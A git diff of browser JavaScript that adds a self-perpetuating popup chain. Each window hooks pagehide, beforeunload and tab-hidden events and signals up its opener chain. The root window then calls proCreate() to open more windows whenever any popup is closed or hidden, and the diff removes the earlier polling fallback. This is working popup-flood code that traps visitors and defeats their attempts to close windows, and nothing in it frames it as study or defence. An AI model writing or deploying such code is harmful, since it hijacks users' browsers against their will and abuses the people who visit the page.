@@ -52,11 +52,6 @@ function bookmark() {
 
 const openWindows = [];
 
-document.addEventListener("mousemove", e => {
-    mouseX = e.clientX;
-    mouseY = e.clientY;
-});
-
 /* ----------------------------
    Open window
 ---------------------------- */
@@ -93,42 +88,78 @@ function proCreate() {
 }
 
 /* ----------------------------
-   INSTANT CLOSE HOOK (postMessage)
+   ROOT CHAIN SYSTEM
 ---------------------------- */
 
-let closeCooldown = false;
+/**
+ * Every popup sends upward until root is reached.
+ * Root triggers actual logic.
+ */
+
+function notifyUpChain() {
+    try {
+        if (window.opener && !window.opener.closed) {
+            window.opener.postMessage(
+                { type: "popup_closed_chain" },
+                "*"
+            );
+        } else {
+            // no opener → we are root
+            handleRootTrigger();
+        }
+    } catch (e) {
+        handleRootTrigger();
+    }
+}
+
+/* ----------------------------
+   Root receiver
+---------------------------- */
 
 window.addEventListener("message", (e) => {
-    if (e.data?.type === "popup_closed") {
-        handlePopupClosed();
+    if (e.data?.type === "popup_closed_chain") {
+        handleRootTrigger();
     }
 });
 
-function handlePopupClosed() {
-    if (closeCooldown) return;
+/* ----------------------------
+   Root handler (spam safe)
+---------------------------- */
 
-    closeCooldown = true;
+let rootCooldown = false;
+
+function handleRootTrigger() {
+    if (rootCooldown) return;
+
+    rootCooldown = true;
 
     proCreate();
 
     setTimeout(() => {
-        closeCooldown = false;
-    }, 200);
+        rootCooldown = false;
+    }, 100);
 }
 
 /* ----------------------------
-   SAFETY FALLBACK (minimal polling)
+   POPUP HOOK (installs on all windows)
 ---------------------------- */
 
-setInterval(() => {
-    for (let i = openWindows.length - 1; i >= 0; i--) {
-        if (!openWindows[i] || openWindows[i].closed) {
-            openWindows.splice(i, 1);
-            handlePopupClosed();
-            break;
-        }
+function installPopupHooks() {
+    function sendCloseSignal() {
+        notifyUpChain();
     }
-}, 300);
+
+    window.addEventListener("pagehide", sendCloseSignal);
+    window.addEventListener("beforeunload", sendCloseSignal);
+
+    document.addEventListener("visibilitychange", () => {
+        if (document.visibilityState === "hidden") {
+            sendCloseSignal();
+        }
+    });
+}
+
+installPopupHooks();
 
 /* ----------------------------
    Movement system
